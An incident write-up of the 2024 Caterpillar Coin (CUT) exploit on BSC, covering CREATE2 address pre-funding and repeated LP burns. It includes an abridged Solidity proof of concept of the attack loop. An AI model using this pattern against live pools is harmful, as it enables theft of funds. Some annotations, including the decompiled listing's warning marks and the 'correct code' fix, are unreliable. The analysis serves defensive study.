# Caterpillar Coin (CUT) — Price Manipulation via CREATE2 Address Prediction and LP Burn

| Field | Details |
|------|------|
| **Date** | 2024-09-10 |
| **Protocol** | Caterpillar Coin (CUT) |
| **Chain** | BSC |
| **Loss** | ~1,400,000 USD |
| **Attacker** | [0x5766d1F03378f50c7c981c014Ed5e5A8124f38A4](https://bscscan.com/address/0x5766d1F03378f50c7c981c014Ed5e5A8124f38A4) |
| **Attack Tx** | [0x2c123d08...](https://bscscan.com/tx/0x2c123d08ca3d50c4b875c0b5de1b5c85d0bf9979dffbf87c48526e3a67396827) |
| **Vulnerable Contract** | [0x7057F3b0F4D0649B428F0D8378A8a0E7D21d36a7](https://bscscan.com/address/0x7057F3b0F4D0649B428F0D8378A8a0E7D21d36a7) (CUT) |
| **Root Cause** | Pre-funding a CREATE2-predictable address before deploying the attack contract, then exploiting the LP burn mechanism |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Caterpillar_Coin_CUT_exp.sol) |

---

## 1. Vulnerability Overview

The Caterpillar Coin (CUT) LP pool burned LP tokens via the `burn()` function and returned the underlying tokens. The attacker computed a CREATE2 predicted address using `calAddress(salt)`, pre-transferred BUSD to that address, then deployed the Attack contract via `createContract(salt)`. The Attack contract constructor repeatedly executed the pattern of swapping BUSD for CUT, adding liquidity, and burning LP tokens — 10 times in total — to steal approximately $1.4 million.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: LP burn() allows arbitrary recipient for token returns
function burn(address to) external lock {
    // ❌ Burns LP tokens and returns underlying tokens to the `to` address
    // If the attacker pre-acquires LP tokens, they can extract CUT via `to`
    uint256 liquidity = balanceOf[address(this)];
    _burn(address(this), liquidity);
    _safeTransfer(token0, to, amount0);  // ❌ `to` is an arbitrary address
    _safeTransfer(token1, to, amount1);
}

// ✅ Correct code: Strengthen fee handling and reentrancy protection on LP burn
function burn(address to) external lock nonReentrant {
    require(to != address(0) && !isBlacklisted[to], "Invalid recipient");  // ✅ Validate recipient
    // ...
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: CaterpillarCoin_decompiled.sol
contract CaterpillarCoin {
contract CaterpillarCoin {
    address public owner;


    // Selector: 0x85db75e8
    function settransferFunDealTypeContractAddress(address p0) external {}  // ❌ Vulnerable

    // Selector: 0xbbeb5348
    function setOpenPlatfromTime(uint256 p0) external {}

    // Selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // Selector: 0xde64fe8d
    function moreUserInsertAddLP(address[] memory p0, uint256 p1, uint256 p2) external {}

    // Selector: 0xdf1aa401
    function setTransferTimeLimit(uint256 p0) external {}

    // Selector: 0xe6546080
    function setUpleaderLPLevelRate(uint256 p0) external {}

    // Selector: 0xf2fde38b
    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)
    function transferOwnership(address p0) external {}

    // Selector: 0xf6d2870a
    function setFirstStatelimitBuyAmount(uint256 p0) external {}

    // Selector: 0xc0102dad
    function setFeeSpecialRecieverAddress(address p0) external {}

    // Selector: 0xc4dda076
    function setCheckSetLeaderTransferAmount(uint256 p0) external {}

    // Selector: 0xc9a700e3
    function getMaxRewardsLPDynamicAmount() external view returns (uint256) {}

    // Selector: 0xd12c0191
    // 📌 Burn — price manipulation risk
    function setLpBurnRate(uint256 p0) external {}

    // Selector: 0xd28d8852
    function _name() external {}

    // Selector: 0x9ca9f1b3
    function setDynamicReawardAccountTransferLimit(uint256 p0) external {}

    // Selector: 0xa457c2d7
    function decreaseAllowance(address p0, uint256 p1) external {}

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0xb09f1266
    function _symbol() external {}

    // Selector: 0xb7899dc2
    function unknown_b7899dc2() external {}

    // Selector: 0xb9862774
    function setManagerUpAddressByAddress(address p0, address p1) external {}

    // Selector: 0x893d20e8
    function getOwner() external view returns (address) {}

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0x901f9ba6
    function setLpFutureYieldContractAddress(address p0) external {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0x4061bba0
    function setMinLpUsdtInvestMoney(uint256 p0) external {}

    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // Selector: 0x715018a6
    function renounceOwnership() external {}

    // Selector: 0x716a0517
    function setLpSwitchAddrRate(uint256 p0) external {}

    // Selector: 0x726e58f3
    function teamEffectiveAcountNum(address p0) external {}

    // Selector: 0x7abca285
    function unknown_7abca285() external {}

    // Selector: 0x7ebb685b
    function setRemoveLPToBlackWholeRate(uint256 p0) external {}

    // Selector: 0x4f648e35
    // 📌 Swap — price manipulation risk
    function setSwapPlatformAddress(address p0) external {}

    // Selector: 0x4f7ad340
    function setBlackWholeRate(uint256 p0) external {}

    // Selector: 0x620b78f7
    function initConfig() external {}

    // Selector: 0x69cec359
    function setFirstStateCheckTimeAfterOpen(uint256 p0) external {}

    // Selector: 0x6adf6d33
    function setSafeCheckContractAddress(address p0) external {}

    // Selector: 0x23b872dd
    // 📌 Arbitrary transferFrom — approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x262161c2
    function setChangeStateRateTimeAfterOpen(uint256 p0) external {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}

    // Selector: 0x32424aa3
    function _decimals() external {}

    // Selector: 0x39509351
    function increaseAllowance(address p0, uint256 p1) external {}

    // Selector: 0x3b4fc659
    function setWhiteAddressFlag(address p0, bool p1) external {}

    // Selector: 0x03fdaffe
    function unknown_03fdaffe() external {}

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

    // Selector: 0x095ea7b3
    // 📌 approve — safeApprove race condition risk
    function approve(address p0, uint256 p1) external {}

    // Selector: 0x0dd37090
    function setIsOpenLpSpecialDealFlag(bool p0) external {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}

    // Selector: 0x18b73731
    function unknown_18b73731() external {}

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► PancakeSwap V2 Flash Swap: Borrow 4,500,000 BUSD
  │
  ├─[2]─► Repeat 10 times:
  │         ├─► calAddress(i): Compute CREATE2 predicted address
  │         ├─► Transfer large amount of BUSD to predicted address
  │         └─► createContract(i): Deploy Attack contract
  │               └─► In constructor:
  │                     ├─► BUSD * 70% → Swap to CUT
  │                     ├─► Remaining BUSD + CUT → addLiquidity
  │                     ├─► CUT → BUSD reverse swap
  │                     ├─► LP tokens → transfer to BUSDCUT pool
  │                     └─► BUSDCUT.burn(address(this))
  │
  ├─[3]─► Repay flash swap
  │
  └─[4]─► Total loss: ~1,400,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        for (uint256 i = 0; i < 10; i++) {
            // [2a] Compute CREATE2 predicted address and transfer BUSD
            uint256 att_bal = BUSD.balanceOf(address(BUSDCUT)) * 3;
            address att_addr = calAddress(i);
            BUSD.transfer(att_addr, att_bal);

            // [2b] Deploy Attack contract (attack executes in constructor)
            createContract(i);
        }
        // [3] Repay flash swap
        BUSD.transfer(msg.sender, ((borrow_amount / 9975) * 10_000) + 10_000);
    }
}

contract Attack {
    constructor() {
        // Full attack sequence executes in the constructor
        uint256 busd_bal = BUSD.balanceOf(address(this));

        // Swap 70% of BUSD → CUT
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busd_bal * 7 / 10, 0, path_BUSD_CUT, address(this), block.timestamp + 1
        );

        // Add liquidity with remaining BUSD + CUT
        Router.addLiquidity(BUSD, CUT, busd_bal_new, cut_bal, 0, 0, address(this), block.timestamp + 1);

        // Reverse swap CUT → BUSD
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            cut_bal_new, 0, path_CUT_BUSD, address(this), block.timestamp + 1
        );

        // Transfer LP tokens to BUSDCUT pool, then burn
        BUSDCUT.transfer(address(BUSDCUT), BUSDCUT.balanceOf(address(this)));
        BUSDCUT.burn(address(this));  // ❌ Extract CUT
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Business Logic Error — LP burn function permits successive addLiquidity/burn calls within a single block, enabling pre-funding via CREATE2 predicted address followed by immediate withdrawal |
| **Attack Technique** | CREATE2 Address Prediction + LP Burn Exploit |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-840: Business Logic Errors |
| **Severity** | Critical |
| **Attack Complexity** | High |

## 6. Remediation Recommendations

1. **LP Burn Access Control**: Enforce a minimum lock period for LP token burns via the `burn()` function.
2. **Same-Block Repetition Defense**: Restrict repeated addLiquidity/burn calls within the same block.
3. **CREATE2 Prediction Mitigation**: Use on-chain monitoring to detect patterns that exploit predictable deployment addresses.
4. **Large Liquidity Change Alerts**: Emit events when a pool balance changes drastically within a single transaction to enable monitoring.

## 7. Lessons Learned

- **CREATE2 Prediction Attack**: A pattern where the deployment address is pre-computed via CREATE2, funds are transferred to it in advance, and then the attack contract is deployed.
- **LP Burn Vulnerability**: The `burn()` function, which burns LP tokens and returns pool assets, is susceptible to attacks involving large LP holdings.
- **Constructor-Based Attack**: Executing the full attack sequence inside the contract constructor guarantees atomic execution.